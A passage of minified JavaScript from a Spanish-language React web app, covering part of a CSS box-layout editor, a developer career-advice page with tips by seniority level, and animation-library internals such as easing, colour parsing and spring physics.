${t.has(X.id)?"dp-layer-active":""}`,onClick:ye=>ti(X.id,ye.ctrlKey||ye.shiftKey||ye.metaKey),children:[b.jsx("span",{className:"dp-layer-color",style:{background:X.bgColor}}),b.jsx("span",{className:"dp-layer-name",children:X.label}),b.jsxs("div",{className:"dp-layer-actions",children:[b.jsx("button",{onClick:ye=>{ye.stopPropagation(),za(X.id)},title:"Duplicar",children:b.jsx(ay,{size:14})}),b.jsx("button",{onClick:ye=>{ye.stopPropagation(),qa(X.id)},title:"Eliminar",children:b.jsx(mP,{size:14})})]})]},X.id))})]}),Ve&&b.jsxs("div",{className:"dp-editor-section",children:[b.jsxs("h3",{className:"dp-editor-title",children:["Propiedades ",t.size>1&&b.jsxs("span",{className:"dp-unit-badge",children:[t.size," cajas"]}),R&&b.jsx("span",{className:"dp-unit-badge",children:"%"})]}),b.jsxs("div",{className:"dp-props-grid",children:[b.jsx("label",{children:"Label"}),b.jsx("input",{type:"text",value:Ve.label,onChange:X=>Ba(Ve.id,{label:X.target.value})}),b.jsxs("label",{children:["X ",R?"%":"px"]}),b.jsx("input",{type:"number",step:R?.5:1,value:G,onChange:X=>{J(X.target.value),X.target.value!==""&&Ba(Ve.id,{x:R?Rf(+X.target.value,Ms):+X.target.value})}}),b.jsxs("label",{children:["Y ",R?"%":"px"]}),b.jsx("input",{type:"number",step:R?.5:1,value:de,onChange:X=>{B(X.target.value),X.target.value!==""&&Ba(Ve.id,{y:R?Rf(+X.target.value,Ns):+X.target.value})}}),b.jsx("label",{children:"Ancho"}),b.jsxs("div",{style:{display:"flex",gap:"0.4rem"},children:[b.jsx("input",{type:"number",step:R?.5:1,style:{flex:1},value:Re,onChange:X=>{if(Oe(X.target.value),X.target.value!==""){const ye=+X.target.value,we=R?Rf(ye,Ms):ye;w?fo(Ve.id,we,Ve.height):t.size>1?zt({width:we}):Ba(Ve.id,{width:we})}}}),b.jsx("button",{className:`dp-btn dp-btn-xs ${R?"dp-btn-active":"dp-btn-ghost"}`,onClick:()=>I(!R),children:"%"})]}),b.jsx("label",{children:"Alto"}),b.jsxs("div",{style:{display:"flex",gap:"0.4rem"},children:[b.jsx("input",{type:"number",step:R?.5:1,style:{flex:1},value:_e,onChange:X=>{if(Xe(X.target.value),X.target.value!==""){const ye=+X.target.value,we=R?Rf(ye,Ns):ye;w?fo(Ve.id,Ve.width,we):t.size>1?zt({height:we}):Ba(Ve.id,{height:we})}}}),b.jsx("button",{className:`dp-btn dp-btn-xs ${R?"dp-btn-active":"dp-btn-ghost"}`,onClick:()=>I(!R),children:"%"})]}),b.jsx("label",{children:"Color"}),b.jsxs("div",{className:"dp-color-row",children:[b.jsx("input",{type:"color",value:Ve.bgColor==="transparent"?"#000000":Ve.bgColor,onChange:X=>{t.size>1?zt({bgColor:X.target.value}):Ba(Ve.id,{bgColor:X.target.value})},title:"Seleccionar color"}),b.jsx("input",{type:"text",value:Ve.bgColor,className:"dp-hex-input",placeholder:"#hex",onChange:X=>{const ye=X.target.value;t.size>1?zt({bgColor:ye}):Ba(Ve.id,{bgColor:ye})},title:"Color Hex"}),b.jsx("div",{className:"dp-color-swatches",children:Sy.map(X=>b.jsx("button",{className:"dp-swatch",style:{background:X},onClick:()=>{t.size>1?zt({bgColor:X}):Ba(Ve.id,{bgColor:X})}},X))})]}),b.jsx("label",{children:"Border-Radius"}),b.jsx("input",{type:"range",min:0,max:100,value:Ve.borderRadius,onChange:X=>{t.size>1?zt({borderRadius:+X.target.value}):Ba(Ve.id,{borderRadius:+X.target.value})}}),b.jsx("label",{children:"Opacidad"}),b.jsx("input",{type:"range",min:0,max:100,value:Math.round(Ve.opacity*100),onChange:X=>{t.size>1?zt({opacity:+X.target.value/100}):Ba(Ve.id,{opacity:+X.target.value/100})}}),b.jsx("label",{children:"Rotacin"}),b.jsx("input",{type:"range",min:-180,max:180,value:Ve.rotation,onChange:X=>{t.size>1?zt({rotation:+X.target.value}):Ba(Ve.id,{rotation:+X.target.value})}}),b.jsx("label",{children:"Z-Index"}),b.jsx("input",{type:"number",value:Ve.zIndex,onChange:X=>{t.size>1?zt({zIndex:+X.target.value}):Ba(Ve.id,{zIndex:+X.target.value})}}),b.jsx("div",{style:{gridColumn:"1 / -1",marginTop:"0.5rem"},children:b.jsxs("button",{className:"dp-btn dp-btn-ghost w-full justify-center",style:{fontSize:"0.75rem"},onClick:()=>{const X={opacity:1,rotation:0,borderRadius:0};t.size>1?zt(X):Ba(Ve.id,X)},children:[b.jsx(jH,{size:14})," Normalizar Estilos"]})})]})]}),b.jsx("div",{className:"dp-editor-section",children:A?b.jsxs(b.Fragment,{children:[b.jsxs("div",{className:"dp-export-header",children:[b.jsx("h3",{className:"dp-editor-title",children:"Cdigo CSS"}),b.jsx("button",{className:`dp-btn dp-btn-copy ${f?"copied":""}`,onClick:Pe,children:f?b.jsxs(b.Fragment,{children:[b.jsx(ay,{size:14})," Copiado"]}):b.jsxs(b.Fragment,{children:[b.jsx(ay,{size:14})," Re-copiar"]})})]}),b.jsx("pre",{className:"dp-code-output",children:d}),b.jsx("button",{className:"dp-btn dp-btn-ghost w-full mt-3 justify-center",style:{width:"100%",marginTop:"0.75rem",fontSize:"0.75rem"},onClick:()=>j(!1),children:"Ocultar cdigo"})]}):b.jsxs("button",{className:"dp-btn dp-btn-primary w-full justify-center",style:{width:"100%",padding:"0.85rem"},onClick:()=>{Pe(),j(!0)},children:[b.jsx(TD,{size:18})," Copiar cdigo"]})})]}),b.jsx("div",{className:"dp-canvas-wrapper",children:b.jsx("div",{className:`dp-canvas ${Q?"is-flex":""}`,ref:St,onClick:()=>n(new Set),style:Q?{display:"flex",flexDirection:M,flexWrap:L,justifyContent:V,alignItems:ce,alignContent:Z,gap:`${Ee}px`,padding:"20px"}:{},children:a.map(X=>b.jsxs("div",{className:`dp-box ${t.has(X.id)?"dp-box-selected":""}`,style:{position:Q?"relative":"absolute",left:Q?void 0:X.x,top:Q?void 0:X.y,width:X.width,height:X.height,backgroundColor:X.bgColor,borderRadius:X.borderRadius,opacity:X.opacity,transform:X.rotation?`rotate(${X.rotation}deg)`:void 0,zIndex:X.zIndex,border:X.bgColor==="transparent"?"1px dashed rgba(255,255,255,0.25)":"1px solid rgba(255,255,255,0.15)",flexShrink:0},onMouseDown:ye=>nn(ye,X),onClick:ye=>ye.stopPropagation(),children:[b.jsx("span",{className:"dp-box-label",children:X.label}),b.jsx("span",{className:"dp-box-dims",children:R?`${$i(X.width,Ms)}%  ${$i(X.height,Ns)}%`:`${X.width}${X.height}`}),b.jsx("div",{className:"resize-handle",onMouseDown:ye=>Ii(ye,X)})]},X.id))})})]})]})},Mee=()=>{const[a,e]=U.useState("junior"),t={junior:{title:"Nivel Junior: Cimentando las Bases",description:"En esta etapa, tu mayor activo es la curiosidad y la capacidad de aprender rpido. No te preocupes por saberlo todo, preocpate por entender cmo funcionan las cosas por debajo.",tips:[{icon:b.jsx(SD,{size:24,className:"advice-icon"}),title:"Domina los Fundamentos",text:"Antes que los frameworks, aprende bien el lenguaje base. Si vas por web, domina JavaScript vanilla, no solo React. Entiende estructuras de datos y algoritmos bsicos."},{icon:b.jsx(HH,{size:24,className:"advice-icon"}),title:"Construye Proyectos Reales",text:"Deja de hacer tutoriales paso a paso (Tutorial Hell). Empieza un proyecto desde cero, rompe cosas y arrglalas. Eso es lo que realmente te ensea."},{icon:b.jsx(e9,{size:24,className:"advice-icon"}),title:"Portfolio Estratgico",text:"No necesitas 20 proyectos mediocres. Necesitas 3 excelentes. Documenta el proceso, los retos que enfrentaste y cmo los solucionaste."},{icon:b.jsx($9,{size:24,className:"advice-icon"}),title:"English is Key",text:"La documentacin ms reciente y los mejores recursos estn en ingls. Incluso un nivel tcnico bsico te abrir puertas globales."}]},semisenior:{title:"Nivel Semi-Senior: Especializacin y Autonoma",description:"Ya sabes construir piezas. Ahora es el momento de aprender a construir sistemas. Esta etapa se trata de profundidad tcnica y de empezar a influir en el equipo.",tips:[{icon:b.jsx(Wf,{size:24,className:"advice-icon"}),title:"Elige tu Especialidad",text:"Conoce un poco de todo (T-shaped profile), pero profundiza seriamente en un rea. S la persona a la que todos acuden cuando hay un problema complejo en X tecnologa."},{icon:b.jsx(Qr,{size:24,className:"advice-icon"}),title:"Clean Code & Testing",text:"No basta con que el cdigo funcione. Debe ser mantenible. Aprende patrones de diseo, principios SOLID y haz que el testing sea parte innegociable de tu workflow."},{icon:b.jsx(fP,{size:24,className:"advice-icon"}),title:"Soft Skills (Habilidades Humanas)",text:"La programacin es un deporte de equipo. Aprende a comunicar ideas tcnicas de forma sencilla, a dar buen feedback y a gestionar tu tiempo eficientemente."},{icon:b.jsx(ZH,{size:24,className:"advice-icon"}),title:"Entiende el Negocio",text:"Empieza a preguntar 'Por qu estamos construyendo esto?'. Un desarrollador que entiende el valor de negocio de su trabajo es mucho ms valioso."}]},senior:{title:"Nivel Senior: Impacto y Arquitectura",description:"Ser Senior no es solo escribir cdigo complejo; es tomar decisiones que ahorren meses de trabajo y elevar el nivel de quienes te rodean.",tips:[{icon:b.jsx(Zr,{size:24,className:"advice-icon"}),title:"Pensamiento de Sistemas",text:"Aprende arquitectura de software. Entiende los tradeoffs (ventajas y desventajas) de cada decisin. No hay 'mejores' soluciones, solo soluciones que encajan mejor en un contexto."},{icon:b.jsx(fP,{size:24,className:"advice-icon"}),title:"Mentoring & Liderazgo",text:"Tu xito se mide por el crecimiento de tu equipo. Dedica tiempo a revisar cdigo con paciencia, a mentorizar juniors y a documentar conocimiento crtico."},{icon:b.jsx(K9,{size:24,className:"advice-icon"}),title:"Estratega de la Pragmtica",text:"A veces la mejor solucin es no escribir cdigo. Aprende a identificar cundo una herramienta de terceros es mejor que construir algo in-house."},{icon:b.jsx(Us,{size:24,className:"advice-icon"}),title:"Legacy & Estndares",text:"Preocpate por la escalabilidad a largo plazo y la seguridad. Define estndares que sobrevivan a tu paso por la empresa."}]}};return b.jsxs("div",{className:"career-container animate-fade-in",children:[b.jsxs("section",{className:"career-hero",children:[b.jsx("span",{className:"career-badge",children:"Gua de Carrera"}),b.jsx("h1",{className:"career-title",children:"Consejos para el xito Profesional"}),b.jsx("p",{className:"career-subtitle",children:"Navega por las distintas etapas de tu evolucin como desarrollador. Desde tu primera lnea de cdigo hasta el liderazgo tcnico."})]}),b.jsxs("div",{className:"level-nav",children:[b.jsxs("button",{className:`level-tab ${a==="junior"?"active":""}`,onClick:()=>e("junior"),children:[b.jsx("span",{className:"tab-icon",children:b.jsx(FH,{size:20})}),"Junior"]}),b.jsxs("button",{className:`level-tab ${a==="semisenior"?"active":""}`,onClick:()=>e("semisenior"),children:[b.jsx("span",{className:"tab-icon",children:b.jsx(MH,{size:20})}),"Semi-Senior"]}),b.jsxs("button",{className:`level-tab ${a==="senior"?"active":""}`,onClick:()=>e("senior"),children:[b.jsx("span",{className:"tab-icon",children:b.jsx(A9,{size:20})}),"Senior"]})]}),b.jsxs("div",{className:"advice-content glass-effect",children:[b.jsxs("div",{className:"advice-header",children:[b.jsx("h2",{children:t[a].title}),b.jsx("p",{children:t[a].description})]}),b.jsx("div",{className:"tips-grid",children:t[a].tips.map((n,i)=>b.jsxs("div",{className:"tip-card",children:[b.jsx("div",{className:"tip-icon-wrapper",children:b.jsx("span",{className:"tip-icon",children:n.icon})}),b.jsx("h3",{children:n.title}),b.jsx("p",{children:n.text})]},i))})]}),b.jsxs("section",{className:"general-resources",children:[b.jsx("h3",{children:"Habilidades Crticas"}),b.jsxs("div",{className:"resources-grid",children:[b.jsxs("div",{className:"res-card",children:[b.jsx("h4",{children:"La Regla de los 15 Minutos"}),b.jsx("p",{children:"Si te quedas atascado, intenta resolverlo por ti mismo durante 15 minutos. Si no puedes, pide ayuda. No esperes horas, pero tampoco preguntes al primer minuto."})]}),b.jsxs("div",{className:"res-card",children:[b.jsx("h4",{children:"Comunicacin Asncrona"}),b.jsx("p",{children:"En trabajo remoto, saber escribir tickets, mensajes de Slack y documentacin clara vale ms que saber 10 lenguajes diferentes."})]}),b.jsxs("div",{className:"res-card",children:[b.jsx("h4",{children:"La Curiosidad vs El Ego"}),b.jsx("p",{children:"Nunca seas la persona ms inteligente del equipo. Si lo eres, ests en el lugar equivocado. Mantn siempre la mentalidad de aprendiz."})]})]})]}),b.jsx("section",{className:"interview-prep glass-effect",children:b.jsxs("div",{className:"prep-info",children:[b.jsx("h3",{children:"Preparacin para Entrevistas"}),b.jsxs("div",{className:"prep-grid",children:[b.jsxs("div",{className:"prep-item",children:[b.jsx("h5",{children:"Criba Tcnica"}),b.jsx("p",{children:"Practica en LeetCode (Easy/Medium) y entiende la Complejidad Temporal (Big O)."})]}),b.jsxs("div",{className:"prep-item",children:[b.jsx("h5",{children:"Entrevista de Sistema"}),b.jsx("p",{children:"Para niveles Senior, estudia cmo escalar bases de datos, balanceadores de carga y cach."})]}),b.jsxs("div",{className:"prep-item",children:[b.jsx("h5",{children:"Cultura y Fit"}),b.jsx("p",{children:"Prepara historias usando el mtodo STAR (Situacin, Tarea, Accin, Resultado)."})]})]})]})})]})},PN=U.createContext({});function Ag(a){const e=U.useRef(null);return e.current===null&&(e.current=a()),e.current}const LN=typeof window<"u",nS=LN?U.useLayoutEffect:U.useEffect,iS=U.createContext(null);function oS(a,e){a.indexOf(e)===-1&&a.push(e)}function qh(a,e){const t=a.indexOf(e);t>-1&&a.splice(t,1)}const Pi=(a,e,t)=>t>e?e:t<a?a:t;let pp=()=>{};const $o={},RN=a=>/^-?(?:\d+(?:\.\d+)?|\.\d+)$/u.test(a);function IN(a){return typeof a=="object"&&a!==null}const wN=a=>/^0[^.\s]+$/u.test(a);function jN(a){let e;return()=>(e===void 0&&(e=a()),e)}const gn=a=>a,Nee=(a,e)=>t=>e(a(t)),Up=(...a)=>a.reduce(Nee),Uc=(a,e,t)=>{const n=e-a;return n===0?1:(t-a)/n};class sS{constructor(){this.subscriptions=[]}add(e){return oS(this.subscriptions,e),()=>qh(this.subscriptions,e)}notify(e,t,n){const i=this.subscriptions.length;if(i)if(i===1)this.subscriptions[0](e,t,n);else for(let r=0;r<i;r++){const l=this.subscriptions[r];l&&l(e,t,n)}}getSize(){return this.subscriptions.length}clear(){this.subscriptions.length=0}}const Ti=a=>a*1e3,Xn=a=>a/1e3;function rS(a,e){return e?a*(1e3/e):0}const DN=(a,e,t)=>(((1-3*t+3*e)*a+(3*t-6*e))*a+3*e)*a,_ee=1e-7,qee=12;function kee(a,e,t,n,i){let r,l,u=0;do l=e+(t-e)/2,r=DN(l,n,i)-a,r>0?t=l:e=l;while(Math.abs(r)>_ee&&++u<qee);return l}function zp(a,e,t,n){if(a===e&&t===n)return gn;const i=r=>kee(r,0,1,a,t);return r=>r===0||r===1?r:DN(i(r),e,n)}const MN=a=>e=>e<=.5?a(2*e)/2:(2-a(2*(1-e)))/2,NN=a=>e=>1-a(1-e),_N=zp(.33,1.53,.69,.99),lS=NN(_N),qN=MN(lS),kN=a=>(a*=2)<1?.5*lS(a):.5*(2-Math.pow(2,-10*(a-1))),cS=a=>1-Math.sin(Math.acos(a)),ON=NN(cS),UN=MN(cS),Oee=zp(.42,0,1,1),Uee=zp(0,0,.58,1),zN=zp(.42,0,.58,1),zee=a=>Array.isArray(a)&&typeof a[0]!="number",BN=a=>Array.isArray(a)&&typeof a[0]=="number",Bee={linear:gn,easeIn:Oee,easeInOut:zN,easeOut:Uee,circIn:cS,circInOut:UN,circOut:ON,backIn:lS,backInOut:qN,backOut:_N,anticipate:kN},Fee=a=>typeof a=="string",LL=a=>{if(BN(a)){pp(a.length===4);const[e,t,n,i]=a;return zp(e,t,n,i)}else if(Fee(a))return Bee[a];return a},If=["setup","read","resolveKeyframes","preUpdate","update","preRender","render","postRender"];function Vee(a,e){let t=new Set,n=new Set,i=!1,r=!1;const l=new WeakSet;let u={delta:0,timestamp:0,isProcessing:!1};function d(f){l.has(f)&&(p.schedule(f),a()),f(u)}const p={schedule:(f,h=!1,E=!1)=>{const A=E&&i?t:n;return h&&l.add(f),A.has(f)||A.add(f),f},cancel:f=>{n.delete(f),l.delete(f)},process:f=>{if(u=f,i){r=!0;return}i=!0,[t,n]=[n,t],t.forEach(d),t.clear(),i=!1,r&&(r=!1,p.process(f))}};return p}const Hee=40;function FN(a,e){let t=!1,n=!0;const i={delta:0,timestamp:0,isProcessing:!1},r=()=>t=!0,l=If.reduce((k,Y)=>(k[Y]=Vee(r),k),{}),{setup:u,read:d,resolveKeyframes:p,preUpdate:f,update:h,preRender:E,render:C,postRender:A}=l,j=()=>{const k=$o.useManualTiming?i.timestamp:performance.now();t=!1,$o.useManualTiming||(i.delta=n?1e3/60:Math.max(Math.min(k-i.timestamp,Hee),1)),i.timestamp=k,i.isProcessing=!0,u.process(i),d.process(i),p.process(i),f.process(i),h.process(i),E.process(i),C.process(i),A.process(i),i.isProcessing=!1,t&&e&&(n=!1,a(j))},R=()=>{t=!0,n=!0,i.isProcessing||a(j)};return{schedule:If.reduce((k,Y)=>{const ee=l[Y];return k[Y]=(Q,q=!1,M=!1)=>(t||R(),ee.schedule(Q,q,M)),k},{}),cancel:k=>{for(let Y=0;Y<If.length;Y++)l[If[Y]].cancel(k)},state:i,steps:l}}const{schedule:va,cancel:ei,state:Lt,steps:Cy}=FN(typeof requestAnimationFrame<"u"?requestAnimationFrame:gn,!0);let Xf;function Gee(){Xf=void 0}const Zt={now:()=>(Xf===void 0&&Zt.set(Lt.isProcessing||$o.useManualTiming?Lt.timestamp:performance.now()),Xf),set:a=>{Xf=a,queueMicrotask(Gee)}},VN=a=>e=>typeof e=="string"&&e.startsWith(a),HN=VN("--"),Qee=VN("var(--"),uS=a=>Qee(a)?Jee.test(a.split("/*")[0].trim()):!1,Jee=/var\(--(?:[\w-]+\s*|[\w-]+\s*,(?:\s*[^)(\s]|\s*\((?:[^)(]|\([^)(]*\))*\))+\s*)\)$/iu;function RL(a){return typeof a!="string"?!1:a.split("/*")[0].includes("var(--")}const tu={test:a=>typeof a=="number",parse:parseFloat,transform:a=>a},mp={...tu,transform:a=>Pi(0,1,a)},wf={...tu,default:1},Hd=a=>Math.round(a*1e5)/1e5,dS=/-?(?:\d+(?:\.\d+)?|\.\d+)/gu;function Wee(a){return a==null}const Kee=/^(?:#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\))$/iu,pS=(a,e)=>t=>!!(typeof t=="string"&&Kee.test(t)&&t.startsWith(a)||e&&!Wee(t)&&Object.prototype.hasOwnProperty.call(t,e)),GN=(a,e,t)=>n=>{if(typeof n!="string")return n;const[i,r,l,u]=n.match(dS);return{[a]:parseFloat(i),[e]:parseFloat(r),[t]:parseFloat(l),alpha:u!==void 0?parseFloat(u):1}},Yee=a=>Pi(0,255,a),Ty={...tu,transform:a=>Math.round(Yee(a))},Yr={test:pS("rgb","red"),parse:GN("red","green","blue"),transform:({red:a,green:e,blue:t,alpha:n=1})=>"rgba("+Ty.transform(a)+", "+Ty.transform(e)+", "+Ty.transform(t)+", "+Hd(mp.transform(n))+")"};function $ee(a){let e="",t="",n="",i="";return a.length>5?(e=a.substring(1,3),t=a.substring(3,5),n=a.substring(5,7),i=a.substring(7,9)):(e=a.substring(1,2),t=a.substring(2,3),n=a.substring(3,4),i=a.substring(4,5),e+=e,t+=t,n+=n,i+=i),{red:parseInt(e,16),green:parseInt(t,16),blue:parseInt(n,16),alpha:i?parseInt(i,16)/255:1}}const B0={test:pS("#"),parse:$ee,transform:Yr.transform},Bp=a=>({test:e=>typeof e=="string"&&e.endsWith(a)&&e.split(" ").length===1,parse:parseFloat,transform:e=>`${e}${a}`}),Os=Bp("deg"),ro=Bp("%"),Ne=Bp("px"),Xee=Bp("vh"),Zee=Bp("vw"),IL={...ro,parse:a=>ro.parse(a)/100,transform:a=>ro.transform(a*100)},gc={test:pS("hsl","hue"),parse:GN("hue","saturation","lightness"),transform:({hue:a,saturation:e,lightness:t,alpha:n=1})=>"hsla("+Math.round(a)+", "+ro.transform(Hd(e))+", "+ro.transform(Hd(t))+", "+Hd(mp.transform(n))+")"},mt={test:a=>Yr.test(a)||B0.test(a)||gc.test(a),parse:a=>Yr.test(a)?Yr.parse(a):gc.test(a)?gc.parse(a):B0.parse(a),transform:a=>typeof a=="string"?a:a.hasOwnProperty("red")?Yr.transform(a):gc.transform(a),getAnimatableNone:a=>{const e=mt.parse(a);return e.alpha=0,mt.transform(e)}},eae=/(?:#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\))/giu;function aae(a){return isNaN(a)&&typeof a=="string"&&(a.match(dS)?.length||0)+(a.match(eae)?.length||0)>0}const QN="number",JN="color",tae="var",nae="var(",wL="${}",iae=/var\s*\(\s*--(?:[\w-]+\s*|[\w-]+\s*,(?:\s*[^)(\s]|\s*\((?:[^)(]|\([^)(]*\))*\))+\s*)\)|#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\)|-?(?:\d+(?:\.\d+)?|\.\d+)/giu;function fp(a){const e=a.toString(),t=[],n={color:[],number:[],var:[]},i=[];let r=0;const u=e.replace(iae,d=>(mt.test(d)?(n.color.push(r),i.push(JN),t.push(mt.parse(d))):d.startsWith(nae)?(n.var.push(r),i.push(tae),t.push(d)):(n.number.push(r),i.push(QN),t.push(parseFloat(d))),++r,wL)).split(wL);return{values:t,split:u,indexes:n,types:i}}function WN(a){return fp(a).values}function KN(a){const{split:e,types:t}=fp(a),n=e.length;return i=>{let r="";for(let l=0;l<n;l++)if(r+=e[l],i[l]!==void 0){const u=t[l];u===QN?r+=Hd(i[l]):u===JN?r+=mt.transform(i[l]):r+=i[l]}return r}}const oae=a=>typeof a=="number"?0:mt.test(a)?mt.getAnimatableNone(a):a;function sae(a){const e=WN(a);return KN(a)(e.map(oae))}const xi={test:aae,parse:WN,createTransformer:KN,getAnimatableNone:sae};function xy(a,e,t){return t<0&&(t+=1),t>1&&(t-=1),t<1/6?a+(e-a)*6*t:t<1/2?e:t<2/3?a+(e-a)*(2/3-t)*6:a}function rae({hue:a,saturation:e,lightness:t,alpha:n}){a/=360,e/=100,t/=100;let i=0,r=0,l=0;if(!e)i=r=l=t;else{const u=t<.5?t*(1+e):t+e-t*e,d=2*t-u;i=xy(d,u,a+1/3),r=xy(d,u,a),l=xy(d,u,a-1/3)}return{red:Math.round(i*255),green:Math.round(r*255),blue:Math.round(l*255),alpha:n}}function kh(a,e){return t=>t>0?e:a}const Ja=(a,e,t)=>a+(e-a)*t,Ay=(a,e,t)=>{const n=a*a,i=t*(e*e-n)+n;return i<0?0:Math.sqrt(i)},lae=[B0,Yr,gc],cae=a=>lae.find(e=>e.test(a));function jL(a){const e=cae(a);if(!e)return!1;let t=e.parse(a);return e===gc&&(t=rae(t)),t}const DL=(a,e)=>{const t=jL(a),n=jL(e);if(!t||!n)return kh(a,e);const i={...t};return r=>(i.red=Ay(t.red,n.red,r),i.green=Ay(t.green,n.green,r),i.blue=Ay(t.blue,n.blue,r),i.alpha=Ja(t.alpha,n.alpha,r),Yr.transform(i))},F0=new Set(["none","hidden"]);function uae(a,e){return F0.has(a)?t=>t<=0?a:e:t=>t>=1?e:a}function dae(a,e){return t=>Ja(a,e,t)}function mS(a){return typeof a=="number"?dae:typeof a=="string"?uS(a)?kh:mt.test(a)?DL:fae:Array.isArray(a)?YN:typeof a=="object"?mt.test(a)?DL:pae:kh}function YN(a,e){const t=[...a],n=t.length,i=a.map((r,l)=>mS(r)(r,e[l]));return r=>{for(let l=0;l<n;l++)t[l]=i[l](r);return t}}function pae(a,e){const t={...a,...e},n={};for(const i in t)a[i]!==void 0&&e[i]!==void 0&&(n[i]=mS(a[i])(a[i],e[i]));return i=>{for(const r in n)t[r]=n[r](i);return t}}function mae(a,e){const t=[],n={color:0,var:0,number:0};for(let i=0;i<e.values.length;i++){const r=e.types[i],l=a.indexes[r][n[r]],u=a.values[l]??0;t[i]=u,n[r]++}return t}const fae=(a,e)=>{const t=xi.createTransformer(e),n=fp(a),i=fp(e);return n.indexes.var.length===i.indexes.var.length&&n.indexes.color.length===i.indexes.color.length&&n.indexes.number.length>=i.indexes.number.length?F0.has(a)&&!i.values.length||F0.has(e)&&!n.values.length?uae(a,e):Up(YN(mae(n,i),i.values),t):kh(a,e)};function $N(a,e,t){return typeof a=="number"&&typeof e=="number"&&typeof t=="number"?Ja(a,e,t):mS(a)(a,e)}const hae=a=>{const e=({timestamp:t})=>a(t);return{start:(t=!0)=>va.update(e,t),stop:()=>ei(e),now:()=>Lt.isProcessing?Lt.timestamp:Zt.now()}},XN=(a,e,t=10)=>{let n="";const i=Math.max(Math.round(e/t),2);for(let r=0;r<i;r++)n+=Math.round(a(r/(i-1))*1e4)/1e4+", ";return`linear(${n.substring(0,n.length-2)})`},Oh=2e4;function fS(a){let e=0;const t=50;let n=a.next(e);for(;!n.done&&e<Oh;)e+=t,n=a.next(e);return e>=Oh?1/0:e}function gae(a,e=100,t){const n=t({...a,keyframes:[0,e]}),i=Math.min(fS(n),Oh);return{type:"keyframes",ease:r=>n.next(i*r).value/e,duration:Xn(i)}}const bae=5;function ZN(a,e,t){const n=Math.max(e-bae,0);return rS(t-a(n),e-n)}const $a={stiffness:100,damping:10,mass:1,velocity:0,duration:800,bounce:.3,visualDuration:.3,restSpeed:{granular:.01,default:2},restDelta:{granular:.005,default:.5},minDuration:.01,maxDuration:10,minDamping:.05,maxDamping:1},Py=.001;function vae({duration:a=$a.duration,bounce:e=$a.bounce,velocity:t=$a.velocity,mass:n=$a.mass}){let i,r,l=1-e;l=Pi($a.minDamping,$a.maxDamping,l),a=Pi($a.minDuration,$a.maxDuration,Xn(a)),l<1?(i=p=>{const f=p*l,h=f*a,E=f-t,C=V0(p,l),A=Math.exp(-h);return Py-E/C*A},r=p=>{const h=p*l*a,E=h*t+t,C=Math.pow(l,2)*Math.pow(p,2)*a,A=Math.exp(-h),j=V0(Math.pow(p,2),l);return(-i(p)+Py>0?-1:1)*((E-C)*A)/j}):(i=p=>{const f=Math.exp(-p*a),h=(p-t)*a+1;return-Py+f*h},r=p=>{const f=Math.exp(-p*a),h=(t-p)*(a*a);return f*h});const u=5/a,d=Eae(i,r,u);if(a=Ti(a),isNaN(d))return{stiffness:$a.stiffness,damping:$a.damping,duration:a};{const p=Math.pow(d,2)*n;return{stiffness:p,damping:l*2*Math.sqrt(n*p),duration:a}}}const yae=12;function Eae(a,e,t){let n=t;for(let i=1;i<yae;i++)n=n-a(n)/e(n);return n}function V0(a,e){return a*Math.sqrt(1-e*e)}const Sae=["duration","bounce"],Cae=["stiffness","damping","mass"];function ML(a,e){return e.some(t=>a[t]!==void 0)}function Tae(a){let e={velocity:$a.velocity,stiffness:$a.stiffness,damping:$a.damping,mass:$a.mass,isResolvedFromDuration:!1,...a};if(!ML(a,Cae)&&ML(a,Sae))if(e.velocity=0,a.visualDuration){const t=a.visualDuration,n=2*Math.PI/(t*1.2),i=n*n,r=2*Pi(.05,1,1-(a.bounce||0))*Math.sqrt(i);e={...e,mass:$a.mass,stiffness:i,damping:r}}else{const t=vae({...a,velocity:0});e={...e,...t,mass:$a.mass},e.isResolvedFromDuration=!0}return e}function Uh(a=$a.visualDuration,e=$a.bounce){const t=typeof a!="object"?{visualDuration:a,keyframes:[0,1],bounce:e}:a;let{restSpeed:n,restDelta:i}=t;const r=t.keyframes[0],l=t.keyframes[t.keyframes.length-1],u={done:!1,value:r},{stiffness:d,damping:p,mass:f,duration:h,velocity:E,isResolvedFromDuration:C}=Tae({...t,velocity:-Xn(t.velocity||0)}),A=E||0,j=p/(2*Math.sqrt(d*f)),R=l-r,I=Xn(Math.sqrt(d/f)),w=Math.abs(R)<5;n||(n=w?$a.restSpeed.granular:$a.restSpeed.default),i||(i=w?$a.restDelta.granular:$a.restDelta.default);let k;if(j<1){const ee=V0(I,j);k=Q=>{const q=Math.exp(-j*I*Q);return l-q*((A+j*I*R)/ee*Math.sin(ee*Q)+R*Math.cos(ee*Q))}}else if(j===1)k=ee=>l-Math.exp(-I*ee)*(R+(A+I*R)*ee);else{const ee=I*Math.sqrt(j*j-1);k=Q=>{const q=Math.exp(-j*I*Q),M=Math.min(ee*Q,300);return l-q*((A+j*I*R)*Math.sinh(M)+ee*R*Math.cosh(M))/ee}}const Y={calculatedDuration:C&&h||null,next:ee=>{const Q=k(ee);if(C)u.done=ee>=h;else{let q=ee===0?A:0;j<1&&(q=ee===0?Ti(A):ZN(k,ee,Q));const M=Math.abs(q)<=n,N=Math.abs(l-Q)<=i;u.done=M&&N}return u.value=u.done?l:Q,u},toString:()=>{const ee=Math.min(fS(Y),Oh),Q=XN(q=>Y.next(ee*q).value,ee,30);return ee+"ms "+Q},toTransition:()=>{}};return Y}Uh.applyToOptions=a=>{const e=gae(a,100,Uh);return a.ease=e.ease,a.duration=Ti(e.duration),a.type="keyframes",a};function H0({keyframes:a,velocity:e=0,power:t=.8,timeConstant:n=325,bounceDamping:i=10,bounceStiffness:r=500,modifyTarget:l,min:u,max:d,restDelta:p=.5,restSpeed:f}){const h=a[0],E={done:!1,value:h},C=M=>u!==void 0&&M<u||d!==void 0&&M>d,A=M=>u===void 0?d:d===void 0||Math.abs(u-M)<Math.abs(d-M)?u:d;let j=t*e;const R=h+j,I=l===void 0?R:l(R);I!==R&&(j=I-h);const 